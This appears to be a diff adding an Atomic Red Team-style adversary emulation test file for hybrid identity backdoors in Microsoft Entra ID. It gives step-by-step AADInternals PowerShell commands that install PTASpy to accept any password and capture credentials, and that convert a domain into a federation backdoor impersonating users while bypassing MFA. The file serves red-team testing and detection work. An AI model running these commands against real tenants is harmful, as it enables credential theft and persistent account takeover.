@@ -1,0 +1,33 @@
+attack_technique: T1556.007
+display_name: 'Modify Authentication Process: Hybrid Identity'
+atomic_tests:
+- name: Backdoor Pass-Through Authentication Agent with AADInternals (PTASpy)
+  description: |
+    Simulates backdooring the Microsoft Entra ID Pass-Through Authentication (PTA) agent using AADInternals. Installing PTASpy on a PTA agent host causes every authentication attempt to succeed with any password and captures submitted credentials in cleartext, providing persistent hybrid-identity access. Run only on a lab server hosting the "Microsoft Azure AD Connect Authentication Agent".
+  supported_platforms:
+  - windows
+  executor:
+    steps: |
+      Run the following on a server that hosts the Entra ID Pass-Through Authentication agent, in an elevated PowerShell session:
+      1. Install the toolkit: Install-Module AADInternals -Force
+      2. Import it: Import-Module AADInternals
+      3. Install the backdoor on the PTA agent host: Install-AADIntPTASpy
+      4. Trigger a sign-in for any hybrid user with an arbitrary password, then review captured credentials: Get-AADIntPTASpyLog -DecodePasswords
+      5. Cleanup: uninstall PTASpy by removing C:\PTASpy and the injected DLL, then restart the "Microsoft Azure AD Connect Authentication Agent" service (Restart-Service AzureADConnectAuthenticationAgent).
+    name: manual
+    elevation_required: true
+- name: Create Entra ID Identity Federation Backdoor with AADInternals
+  description: |
+    Simulates converting a managed Entra ID domain into a federated domain with AADInternals to create a persistent authentication backdoor that allows impersonating any user and bypassing MFA. Requires Global Administrator in a lab tenant.
+  supported_platforms:
+  - azure-ad
+  executor:
+    steps: |
+      Run the following in PowerShell against a lab tenant where you hold Global Administrator:
+      1. Install and import AADInternals: Install-Module AADInternals -Force ; Import-Module AADInternals
+      2. Authenticate: Get-AADIntAccessTokenForAADGraph -SaveToCache
+      3. Create the federation backdoor for a (verified) domain: ConvertTo-AADIntBackdoor -DomainName "yourdomain.com"
+      4. Obtain a target user's ImmutableId: $iid = (Get-AADIntUser -UserPrincipalName "victim@yourdomain.com").ImmutableId
+      5. Impersonate the user, bypassing MFA: Open-AADIntOffice365Portal -ImmutableID $iid -Issuer (Get-AADIntBackdoorIssuer -DomainName "yourdomain.com") -ByPassMFA $true
+      6. Cleanup: restore the domain to managed authentication with Set-AADIntDomainAuthentication -DomainName "yourdomain.com" -Authentication Managed.
+    name: manual
